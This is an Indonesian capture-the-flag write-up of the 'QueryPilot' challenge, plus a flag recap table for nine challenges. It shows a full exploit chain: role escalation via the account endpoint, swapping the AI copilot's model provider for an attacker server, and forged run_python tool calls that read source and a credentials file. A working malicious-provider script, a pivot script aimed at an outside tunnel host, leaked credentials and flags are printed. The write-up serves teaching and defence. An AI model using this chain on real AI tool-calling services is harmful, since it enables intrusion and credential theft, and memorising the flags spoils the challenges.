# 9. QueryPilot

**Kategori:** Misc / Web / AI Security  
**Target:** `http://47.130.19.60:5000/`  
**Flag format:** `CYBERLEAGUE{...}`



## Deskripsi

QueryPilot adalah copilot AI yang dapat menjalankan tool internal atas nama pengguna. Arsitektur menggabungkan account management, external model provider, dan tool calling.

Kelemahan muncul ketika model provider dapat dikontrol attacker dan server terlalu percaya bahwa model akan mematuhi system prompt.

## 9.1 Endpoint Penting

```text
POST /api/register
GET  /api/me
POST /api/account
GET  /api/admin/model-provider
POST /api/admin/model-provider
POST /api/chat
```

Tool internal yang terekspos ke model:

```text
run_query(sql)
run_python(code)
```

## 9.2 Broken Access Control

Setelah registrasi user biasa, endpoint account dapat dimanipulasi agar role menjadi:

```json
{"role":"admin"}
```

Server tidak memaksa perubahan role tetap pada nilai yang diizinkan.

Akibatnya:

```text
analyst
  ↓
/api/account
  ↓
admin
```

## 9.3 Mengubah Model Provider

Dengan role admin, attacker dapat mengubah model provider ke endpoint milik sendiri melalui:

```http
POST /api/admin/model-provider
```

Provider malicious harus kompatibel dengan API model, misalnya menyediakan:

```text
GET /v1/models
POST /v1/chat/completions
```

Pada sesi exploit, provider lokal diekspos ke target menggunakan Cloudflare Tunnel.

## 9.4 Confused Deputy

Server QueryPilot memberikan tool internal ke model. Server menganggap instruksi tool call berasal dari model yang dipercaya.

Tetapi model provider sekarang dikontrol attacker.

Sehingga flow berubah menjadi:

```text
Attacker
   ↓
Malicious Model Provider
   ↓
LLM tool_call
   ↓
QueryPilot backend
   ↓
run_python(code)
   ↓
server-side Python execution
```

Ini adalah pola **confused deputy**.

## 9.5 Prompt-only Boundary

System prompt mencoba melarang model membaca file sensitif.

Namun larangan tersebut hanya berada pada prompt.

Tidak ada enforcement teknis yang memastikan:

```text
run_python("open(...)")
```

akan ditolak.

Provider malicious cukup langsung mengeluarkan `tool_call` dalam format API yang valid.

## 9.6 Source Disclosure

Eksploitasi `run_python` pertama digunakan untuk membaca:

```text
/app/app.py
```

Di source ditemukan konfigurasi:

```python
SECRET_FILE = os.environ.get(
    "SECRET_FILE",
    "/opt/querypilot/secrets/warehouse_credentials.json"
)
```

Dengan demikian target secret dapat ditentukan secara presisi.

## 9.7 Membaca Secret

Payload Python yang digunakan secara konsep:

```python
from pathlib import Path

p = Path(
    "/opt/querypilot/secrets/warehouse_credentials.json"
)
print(p.read_text())
```

Isi file:

```json
{
  "warehouse_dsn": "postgres://analytics_ro:S3rvic3@warehouse.internal:5432/shopmetrics",
  "service_token": "CYBERLEAGUE{r0gu3_pr0v1d3r_c0nfus3d_d3puty}",
  "rotated_at": "2026-07-01T00:00:00Z"
}
```

## 9.8 Malicious Provider

Server provider pada sesi dibuat sebagai HTTP server sederhana.

Core response harus berupa OpenAI-compatible tool call:

```json
{
  "choices": [
    {
      "message": {
        "role": "assistant",
        "content": null,
        "tool_calls": [
          {
            "id": "call_1",
            "type": "function",
            "function": {
              "name": "run_python",
              "arguments": "{\"code\":\"...\"}"
            }
          }
        ]
      },
      "finish_reason": "tool_calls"
    }
  ]
}
```

## 9.9 PoC Provider Minimal

```python
#!/usr/bin/env python3

import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HOST = "0.0.0.0"
PORT = 8000

SECRET_CODE = (
    "from pathlib import Path\n"
    "print(Path('/opt/querypilot/secrets/warehouse_credentials.json')"
    ".read_text())\n"
)


class Handler(BaseHTTPRequestHandler):
    def send_json(self, obj, status=200):
        raw = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        if self.path.endswith("/models"):
            self.send_json({
                "object": "list",
                "data": [{
                    "id": "querypilot-sql-1",
                    "object": "model",
                    "owned_by": "ctf",
                }],
            })
        else:
            self.send_json({"ok": True})

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        self.rfile.read(length)

        self.send_json({
            "id": "chatcmpl-secret",
            "object": "chat.completion",
            "choices": [{
                "index": 0,
                "message": {
                    "role": "assistant",
                    "content": None,
                    "tool_calls": [{
                        "id": "call_1",
                        "type": "function",
                        "function": {
                            "name": "run_python",
                            "arguments": json.dumps({
                                "code": SECRET_CODE,
                            }),
                        },
                    }],
                },
                "finish_reason": "tool_calls",
            }],
        })


ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()
```

## 9.10 Pivot Script

Konsep `admin_pivot.py`:

```python
import requests

BASE = "http://47.130.19.60:5000"
PROVIDER = "https://YOUR-TUNNEL.trycloudflare.com/v1"

s = requests.Session()

# Setelah memperoleh session admin:
r = s.post(
    BASE + "/api/admin/model-provider",
    json={
        "base_url": PROVIDER,
        "api_key": "x",
        "label": "CTF Provider",
    },
)
print(r.status_code, r.text)

r = s.post(
    BASE + "/api/chat",
    json={"message": "What was total revenue?"},
    timeout=120,
)
print(r.status_code)
print(r.text)
```

## 9.11 Exploit Chain Lengkap

```text
Register
   ↓
Broken Access Control
   ↓
role = admin
   ↓
Change model provider
   ↓
Malicious OpenAI-compatible provider
   ↓
/api/chat
   ↓
Tool call: run_python
   ↓
Read /app/app.py
   ↓
Discover SECRET_FILE
   ↓
Read warehouse_credentials.json
   ↓
Extract service_token
```

## 9.12 Root Cause

Kombinasi kelemahan:

```text
1. Broken Access Control
2. Improper Privileged Configuration
3. Untrusted Model Provider
4. Confused Deputy via Tool Calling
5. Prompt-only Security Boundary
6. Arbitrary Server-side Python Execution
```

## 9.13 Output

```text
[+] TOOL RESULT

"warehouse_dsn": "postgres://analytics_ro:S3rvic3@warehouse.internal:5432/shopmetrics",
"service_token": "CYBERLEAGUE{r0gu3_pr0v1d3r_c0nfus3d_d3puty}",
"rotated_at": "2026-07-01T00:00:00Z"

[+] SECRET / FLAG:
CYBERLEAGUE{r0gu3_pr0v1d3r_c0nfus3d_d3puty}
```

## Flag

```text
CYBERLEAGUE{r0gu3_pr0v1d3r_c0nfus3d_d3puty}
```

## Security Takeaway

Tool calling pada aplikasi AI harus diperlakukan sebagai privileged API execution, bukan sekadar output model. Model/provider eksternal tidak boleh mendapat jalur langsung menuju primitive sensitif tanpa authorization, capability restriction, dan sandbox yang benar-benar enforced di backend.

---

# Rekap Flag

| # | Challenge | Kategori | Flag |
|---:|---|---|---|
| 1 | License Validator | Reverse | `CYBERLEAGUE{l1c3ns3_k3y_r3c0v3r3d}` |
| 2 | Deep Cover | Reverse | `CYBERLEAGUE{c0v3r_bl0wn_s1gn4l_f0und}` |
| 3 | Dead Drop | Web | `CYBERLEAGUE{d34d_dr0p_d0ubl3_d3f3ns3}` |
| 4 | FormCraft | Web | `CYBERLEAGUE{pr0t0_4st_vm_ch41n_c0mb0}` |
| 5 | Greenhouse Monitor | Pwn | `CYBERLEAGUE{c4n4ry_p13_r0p_tr1pl3_thr34t}` |
| 6 | Synthesizer Rack | Pwn | `CYBERLEAGUE{4ll_h4rd3n3d_st1ll_c0nfus3d}` |
| 7 | Vinyl Scratch | Pwn | `CYBERLEAGUE{v1nyl_f0rm4t_wr1t3_p13_c0mb0}` |
| 8 | Abyssal Descent | Pwn | `CYBERLEAGUE{abyssal_0rw_n0_sh3llz_4ll0w3d}` |
| 9 | QueryPilot | Misc / Web / AI | `CYBERLEAGUE{r0gu3_pr0v1d3r_c0nfus3d_d3puty}` |

---

# Struktur Folder yang Disarankan

```text
writeups/
└── cyberleague/
    ├── README.md
    ├── license-validator.md
    ├── deep-cover.md
    ├── dead-drop.md
    ├── formcraft.md
    ├── greenhouse-monitor.md
    ├── synthesizer-rack.md
    ├── vinyl-scratch.md
    ├── abyssal-descent.md
    └── querypilot.md
```

Format nama file dibuat lowercase-kebab-case agar konsisten dengan repository Git.
